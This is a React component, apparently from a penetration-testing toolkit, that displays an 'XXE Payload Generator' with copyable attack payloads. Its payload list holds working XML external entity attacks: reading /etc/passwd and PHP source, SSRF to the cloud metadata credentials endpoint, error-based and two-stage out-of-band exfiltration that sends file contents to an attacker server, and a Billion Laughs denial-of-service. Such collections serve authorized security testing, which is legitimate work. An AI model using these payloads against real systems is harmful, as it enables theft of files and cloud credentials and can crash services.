import { useState } from "react";
import CyberpunkCard from "@/components/CyberpunkCard";
import { Copy, Check } from "lucide-react";

interface Payload {
  title: string;
  category: string;
  description: string;
  payload: string;
}

const PAYLOADS: Payload[] = [
  {
    title: "Basic File Read (/etc/passwd)",
    category: "File Read",
    description: "Classic XXE to read local files. Replace the file path with your target.",
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`,
  },
  {
    title: "Basic File Read (Windows)",
    category: "File Read",
    description: "XXE file read for Windows targets.",
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>&xxe;</root>`,
  },
  {
    title: "SSRF via XXE",
    category: "SSRF",
    description: "Use XXE to make the server perform HTTP requests to internal services.",
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>`,
  },
  {
    title: "SSRF to Internal Host",
    category: "SSRF",
    description: "Probe internal network services through XXE SSRF.",
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/">
]>
<root>&xxe;</root>`,
  },
  {
    title: "Error-Based Exfiltration",
    category: "Exfiltration",
    description: "Trigger a parse error to leak file contents in error messages.",
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root/>`,
  },
  {
    title: "OOB with DNS Callback",
    category: "Out-of-Band",
    description: "Trigger DNS lookup to confirm XXE via out-of-band channel. Replace with your Burp Collaborator/interactsh URL.",
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-ID.burpcollaborator.net/xxe">
]>
<root>&xxe;</root>`,
  },
  {
    title: "OOB Data Exfiltration via DTD",
    category: "Out-of-Band",
    description: "Two-stage OOB: external DTD loads file, then exfiltrates via HTTP. Host the evil.dtd file on your server.",
    payload: `<!-- evil.dtd hosted on your server: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%eval;
%exfil;

<!-- XXE payload sent to victim: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://YOUR-SERVER/evil.dtd">
<root/>`,
  },
  {
    title: "Billion Laughs DoS",
    category: "Denial of Service",
    description: "Exponential entity expansion causes memory exhaustion. WARNING: Will crash vulnerable parsers.",
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>`,
  },
  {
    title: "PHP Filter Wrapper (base64 read)",
    category: "PHP Filter",
    description: "Read PHP source code via the PHP filter wrapper — bypasses restrictions on reading .php files directly.",
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<root>&xxe;</root>`,
  },
  {
    title: "PHP Filter (rot13 encoding)",
    category: "PHP Filter",
    description: "Alternative encoding to bypass content filters when base64 is blocked.",
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=/etc/passwd">
]>
<root>&xxe;</root>`,
  },
];

const CATEGORIES = ["All", ...Array.from(new Set(PAYLOADS.map((p) => p.category)))];

const CopyBtn = ({ text }: { text: string }) => {
  const [copied, setCopied] = useState(false);
  const handle = () => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 1200);
    });
  };
  return (
    <button onClick={handle}
      className="flex items-center gap-1 px-2 py-1 rounded text-xs bg-cyber-cyan/10 hover:bg-cyber-cyan/20 text-cyber-cyan border border-cyber-cyan/20 transition-colors">
      {copied ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
      {copied ? "Copied" : "Copy"}
    </button>
  );
};

const XXEPayloadGenerator = () => {
  const [category, setCategory] = useState("All");

  const filtered = category === "All" ? PAYLOADS : PAYLOADS.filter((p) => p.category === category);

  return (
    <CyberpunkCard title="XXE PAYLOAD GENERATOR">
      <div className="space-y-5">
        <div className="flex flex-wrap gap-2">
          {CATEGORIES.map((cat) => (
            <button
              key={cat}
              onClick={() => setCategory(cat)}
              className={`px-3 py-1 rounded text-xs font-mono transition-colors ${
                category === cat
                  ? "bg-cyber-red text-white font-bold"
                  : "bg-cyber-cyan/20 text-cyber-cyan border border-cyber-cyan/30 hover:bg-cyber-cyan/30"
              }`}
            >
              {cat}
            </button>
          ))}
        </div>

        <div className="space-y-4">
          {filtered.map((p, i) => (
            <div key={i} className="glass-panel rounded p-4">
              <div className="flex items-start justify-between mb-2">
                <div>
                  <span className="text-sm font-bold text-cyber-cyan">{p.title}</span>
                  <span className="ml-2 px-2 py-0.5 rounded text-xs bg-cyber-cyan/10 text-cyber-cyan border border-cyber-cyan/20">
                    {p.category}
                  </span>
                </div>
                <CopyBtn text={p.payload} />
              </div>
              <p className="text-xs text-gray-400 mb-3">{p.description}</p>
              <pre className="text-xs text-green-400 font-mono bg-black/40 rounded p-3 overflow-x-auto whitespace-pre">
                {p.payload}
              </pre>
            </div>
          ))}
        </div>

        <p className="text-xs text-gray-500">
          For authorized penetration testing only. Always obtain written permission before testing.
        </p>
      </div>
    </CyberpunkCard>
  );
};

export default XXEPayloadGenerator;
